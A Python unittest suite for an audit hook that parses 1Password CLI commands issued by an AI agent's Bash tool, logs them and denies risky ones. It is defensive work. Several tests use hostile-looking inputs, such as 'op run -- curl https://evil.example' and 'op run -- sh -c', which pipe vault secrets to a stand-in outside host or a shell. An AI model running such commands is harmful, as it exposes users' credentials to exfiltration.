import json
import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import op_audit


class TestParse(unittest.TestCase):
    def test_detects_op_run_with_ref_and_child(self):
        p = op_audit.parse_op_command("op run --vault Dev --env-file .env.tpl -- node app.js")
        self.assertEqual(p["op_subcommand"], "run")
        self.assertEqual(p["child"], "node app.js")

    def test_extracts_refs(self):
        p = op_audit.parse_op_command('op read "op://Dev/OpenAI/credential"')
        self.assertEqual(p["refs"], ["op://Dev/OpenAI/credential"])

    def test_non_op_returns_none(self):
        self.assertIsNone(op_audit.parse_op_command("npm test"))

    def test_op_via_abs_path(self):
        p = op_audit.parse_op_command("/usr/bin/op vault list")
        self.assertEqual(p["op_subcommand"], "vault")


class TestRisk(unittest.TestCase):
    def test_denies_curl_child(self):
        parsed = op_audit.parse_op_command("op run -- curl https://evil.example")
        decision, reason = op_audit.assess_risk(parsed)
        self.assertEqual(decision, "deny")
        self.assertIn("curl", reason)

    def test_denies_shell_child(self):
        parsed = op_audit.parse_op_command("op run -- sh -c 'echo $X'")
        self.assertEqual(op_audit.assess_risk(parsed)[0], "deny")

    def test_allows_benign_child(self):
        parsed = op_audit.parse_op_command("op run -- npm test")
        self.assertEqual(op_audit.assess_risk(parsed)[0], "allow")

    def test_allows_plain_read(self):
        parsed = op_audit.parse_op_command('op read "op://Dev/A/b"')
        self.assertEqual(op_audit.assess_risk(parsed)[0], "allow")

    def test_skips_env_prefix_then_denies(self):
        parsed = op_audit.parse_op_command("op run -- FOO=bar curl x")
        self.assertEqual(op_audit.assess_risk(parsed)[0], "deny")


class TestHook(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.log = os.path.join(self.tmp, "op-access.jsonl")
        os.environ["OP_AUDIT_ENABLED"] = "1"

    def tearDown(self):
        os.environ.pop("OP_AUDIT_ENABLED", None)

    def _event(self, command):
        return json.dumps({"tool_name": "Bash", "session_id": "s1",
                           "cwd": "/repo", "tool_input": {"command": command}})

    def test_inert_when_not_enabled(self):
        os.environ.pop("OP_AUDIT_ENABLED", None)
        out = op_audit.run_hook(self._event("op run -- curl x"), "2026-01-01T00:00:00+00:00", self.log)
        self.assertIsNone(out)
        self.assertFalse(os.path.exists(self.log))

    def test_logs_and_allows_benign(self):
        out = op_audit.run_hook(self._event("op run -- npm test"), "2026-01-01T00:00:00+00:00", self.log)
        self.assertIsNone(out)
        lines = Path(self.log).read_text().splitlines()
        self.assertEqual(len(lines), 1)
        self.assertEqual(json.loads(lines[0])["decision"], "allow")

    def test_denies_and_logs_risky(self):
        out = op_audit.run_hook(self._event("op run -- curl https://evil"), "2026-01-01T00:00:00+00:00", self.log)
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")
        self.assertEqual(json.loads(Path(self.log).read_text().splitlines()[0])["decision"], "deny")

    def test_ignores_non_bash(self):
        ev = json.dumps({"tool_name": "Read", "tool_input": {}})
        self.assertIsNone(op_audit.run_hook(ev, "t", self.log))

    def test_ignores_non_op_bash(self):
        self.assertIsNone(op_audit.run_hook(self._event("npm test"), "t", self.log))
        self.assertFalse(os.path.exists(self.log))

    def test_log_file_is_0600(self):
        op_audit.run_hook(self._event("op vault list"), "2026-01-01T00:00:00+00:00", self.log)
        self.assertEqual(os.stat(self.log).st_mode & 0o777, 0o600)


class TestVerify(unittest.TestCase):
    def _line(self, **over):
        base = {"ts": "2026-01-01T00:00:00+00:00", "session_id": "s", "cwd": "/r",
                "op_subcommand": "read", "refs": ["op://V/I/f"], "child": None, "decision": "allow"}
        base.update(over)
        return json.dumps(base)

    def test_clean_log_passes(self):
        self.assertEqual(
            op_audit.verify_lines([self._line(), self._line(ts="2026-01-02T00:00:00+00:00")]), [])

    def test_bad_json_flagged(self):
        self.assertTrue(op_audit.verify_lines(["{not json"]))

    def test_extra_field_flagged(self):
        f = op_audit.verify_lines([self._line(secret="leaked-value")])
        self.assertTrue(any("unexpected field" in x for x in f))

    def test_bad_ref_flagged(self):
        f = op_audit.verify_lines([self._line(refs=["not-a-ref"])])
        self.assertTrue(any("op://" in x for x in f))

    def test_non_monotonic_ts_flagged(self):
        f = op_audit.verify_lines([self._line(ts="2026-02-01T00:00:00+00:00"),
                                   self._line(ts="2026-01-01T00:00:00+00:00")])
        self.assertTrue(any("precedes" in x for x in f))


if __name__ == "__main__":
    unittest.main()
